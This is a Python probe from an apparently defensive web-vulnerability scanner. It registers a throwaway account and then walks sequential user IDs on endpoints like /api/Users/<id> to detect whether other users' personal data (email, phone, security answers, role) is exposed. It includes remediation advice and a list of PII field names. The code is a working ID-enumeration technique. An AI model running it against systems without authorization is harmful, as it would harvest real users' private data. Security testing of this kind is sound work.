#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization: foreign-user PII via sequential ID enumeration on
`/api/Users/<id>`.

Different from the existing `authz_admin_section_force_browse`
(unauthenticated dump of /api/Users) and `authz_address_idor_walk`
(addresses). This probe focuses on the per-user-detail endpoint
that's authenticated, but doesn't verify that the *id* in the URL
matches the caller -- so any logged-in user can read every other
user's PII (email, phone, dob, security-question answer, role).

Detection signal:
  1. Register a throwaway user, capture their token + id.
  2. GET /api/Users/{1..10} (skip own id).
  3. Validate when at least one foreign id returns a JSON object
     containing `email` AND any of {phone, dob, address,
     securityAnswer, securityQuestion, role}.

Tested against:
  + OWASP Juice Shop  /api/Users/<id> with a normal-user token
                      returns full user objects including email,
                      role, profileImage -> validated=True
                      (currently surfaces 'email + role' which
                      qualifies under the PII-field rule).
  + nginx default site -> validated=False.

Read-only: only register + login + GETs. We never modify a foreign
user's data.
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

USER_DETAIL_PATHS = (
    "/api/Users/{id}",
    "/api/users/{id}",
    "/api/v1/users/{id}",
    "/api/v2/users/{id}",
    "/users/{id}",
)

# PII fields that, alongside `email`, qualify as "this is more PII
# than a normal user should see about another normal user."
PII_FIELDS = {"phone", "phonenumber", "mobile",
              "dob", "dateofbirth", "birthdate", "birthday",
              "address", "street", "postcode", "zip", "zipcode",
              "securityquestion", "securityanswer",
              "role", "roles", "isadmin", "is_admin", "lastloginip",
              "ssn", "nationalid", "taxid"}


def _register_and_login(client: SafeClient, origin: str
                        ) -> tuple[str | None, int | None, dict]:
    """Throwaway register + login. Returns (token, user_id, diag)."""
    email = f"pii-idor-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    diag: dict = {"email": email}
    body = json.dumps({
        "email": email, "password": pw, "passwordRepeat": pw,
        "securityQuestion": {"id": 1}, "securityAnswer": "probe",
    }).encode()
    r = client.request(
        "POST", urljoin(origin, "/api/Users"),
        headers={"Content-Type": "application/json"}, body=body)
    diag["register_status"] = r.status
    user_id = None
    if r.status in (200, 201) and r.body:
        try:
            doc = json.loads(r.text)
            data = doc.get("data") if isinstance(doc, dict) else None
            if isinstance(data, dict):
                user_id = data.get("id")
        except json.JSONDecodeError:
            pass
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request(
        "POST", urljoin(origin, "/rest/user/login"),
        headers={"Content-Type": "application/json"}, body=body)
    diag["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            tok = ((doc.get("authentication") or {}).get("token")
                   if isinstance(doc, dict) else None) or doc.get("token")
            if tok:
                return tok, user_id, diag
        except json.JSONDecodeError:
            pass
    return None, user_id, diag


def _flatten(node, depth: int = 0) -> dict:
    """Flatten the first 1-2 levels of a parsed JSON document so we
    can do field-set membership against a single dict. The user-
    detail responses we care about are typically `{data: {...}}` or
    `{user: {...}}` -- one level of unwrap covers them."""
    if depth > 2 or not isinstance(node, dict):
        return {}
    out: dict = {}
    for k, v in node.items():
        if isinstance(v, dict):
            out.update(_flatten(v, depth + 1))
        else:
            out[k] = v
    return out


def _qualifying_pii(obj: dict) -> tuple[bool, list[str]]:
    """Return (qualifies, matched_pii_keys). Qualifies when `email`
    is present AND at least one PII_FIELDS key is present. Match is
    case-insensitive."""
    keys = {k.lower() for k in obj.keys() if isinstance(k, str)}
    if "email" not in keys:
        return False, []
    matched = sorted(keys & PII_FIELDS)
    return (len(matched) > 0), matched


class AuthzPiiIdorUserEnumProbe(Probe):
    name = "authz_pii_idor_user_enum"
    summary = ("Detects per-user-detail endpoints that return foreign "
               "users' PII to any authenticated caller.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--max-id", type=int, default=10,
            help="Highest id to probe (default 10).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        max_id = max(2, int(args.max_id or 10))

        token, own_id, diag = _register_and_login(client, origin)
        if not token:
            return Verdict(
                validated=None, confidence=0.5, ok=True,
                summary=(f"Inconclusive: could not establish a probe "
                         f"session on {origin} (register status "
                         f"{diag.get('register_status')}, login status "
                         f"{diag.get('login_status')})."),
                evidence={"origin": origin, "diag": diag},
            )

        attempts: list[dict] = []
        confirmed: list[dict] = []
        for path_tpl in USER_DETAIL_PATHS:
            for uid in range(1, max_id + 1):
                if own_id is not None and uid == own_id:
                    continue
                url = urljoin(origin, path_tpl.replace("{id}", str(uid)))
                r = client.request("GET", url, headers={
                    "Authorization": f"Bearer {token}",
                })
                row: dict = {"path": url, "id": uid,
                             "status": r.status, "size": r.size}
                if r.status == 200 and r.body:
                    try:
                        doc = json.loads(r.text)
                    except (ValueError, json.JSONDecodeError):
                        doc = None
                    if isinstance(doc, dict):
                        flat = _flatten(doc)
                        ok, matched = _qualifying_pii(flat)
                        if ok:
                            row.update({"foreign_id": uid,
                                        "matched_pii": matched,
                                        "email_present": True})
                            confirmed.append(row)
                attempts.append(row)
                if len(confirmed) >= 2:
                    break
            if len(confirmed) >= 2 and confirmed:
                break

        evidence = {"origin": origin, "own_user_id": own_id,
                    "attempts": attempts,
                    "session_diag": diag}
        if confirmed:
            sample = confirmed[0]
            return Verdict(
                validated=True, confidence=0.92,
                summary=(
                    f"Confirmed: any authenticated caller on {origin} "
                    f"can read foreign users' PII. As probe-user "
                    f"{own_id}, GET {sample['path']} returned a profile "
                    f"with email and "
                    f"{', '.join(sample['matched_pii'])}. "
                    f"{len(confirmed)} foreign user(s) accessible."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="high",
                remediation=(
                    "Enforce ownership at the controller layer: the "
                    "user id in the URL must equal the authenticated "
                    "caller's id (or the caller must hold an admin "
                    "role).\n"
                    "  - Express: in the route handler, "
                    "  `if (req.params.id !== String(req.user.id) && "
                    "  !req.user.isAdmin) return res.status(403)`.\n"
                    "  - Django REST: override `get_queryset()` on the "
                    "ViewSet to filter by `self.request.user.id`.\n"
                    "  - Rails: `authorize @user` via Pundit; the "
                    "policy's `show?` returns `record == user || "
                    "user.admin?`.\n"
                    "  - Spring: a `@PreAuthorize` annotation that "
                    "compares `#id == authentication.principal.id`.\n"
                    "Audit access logs for sequential id enumeration on "
                    "the affected endpoint -- patterns of one IP hitting "
                    "/api/Users/1, /api/Users/2, ... in quick succession "
                    "are the canonical exfiltration shape."),
            )
        return Verdict(
            validated=False, confidence=0.80,
            summary=(f"Refuted: tested {len(attempts)} foreign-user-id "
                     f"requests on {origin}; none returned a PII-shaped "
                     "response (email + at least one of phone/dob/"
                     "address/role)."),
            evidence=evidence,
        )


if __name__ == "__main__":
    AuthzPiiIdorUserEnumProbe().main()
